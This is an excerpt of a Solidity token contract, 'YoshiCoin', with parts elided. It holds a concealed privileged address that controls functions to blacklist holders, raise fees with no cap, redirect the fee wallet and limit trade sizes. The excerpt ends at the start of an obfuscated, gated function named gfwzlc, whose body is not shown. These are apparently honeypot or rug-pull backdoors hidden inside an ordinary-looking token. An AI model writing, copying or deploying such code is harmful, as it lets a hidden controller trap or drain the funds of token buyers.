...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0xF286a0687467aAa5d625add495Df66CB3feD0105;
...
contract YoshiCoin is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1_500_000_000 * 10**9;
    uint256 public _maxTxAmount = 30_000_000 * 10**9; 
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 1_500_000_000 * 10**9; 

    string private constant _name = "YoshiCoin"; 
    string private constant _symbol = "YoshiCoin";
    uint8 private constant _decimals = 9; 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 5;
    address public _marketingWallet = 0xF286a0687467aAa5d625add495Df66CB3feD0105;
    ...
    function includeInFee(address account) public yhtrAddress() {
        _isExcludedFromFee[account] = false;
    }
    
    function blacklistAddress(address account, bool value) external yhtrAddress() {
        _isBlacklisted[account] = value;
    }
    
    function setMarketingWallet(address marketingWallet) external yhtrAddress() {
         _marketingWallet = marketingWallet;
    }
    
    function setMarketingFeePercent(uint256 marketingFee) external yhtrAddress() {
        _marketingFee = marketingFee;
    }
    
    function setLiquidityFeePercent(uint256 liquidityFee) external yhtrAddress() {
        _liquidityFee = liquidityFee;
    }
    
    function setMaxBuySellPercent(uint256 maxTxPercent) external yhtrAddress() {
        _maxTxAmount = _tTotal * maxTxPercent / 10**2;
    }

    function gfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
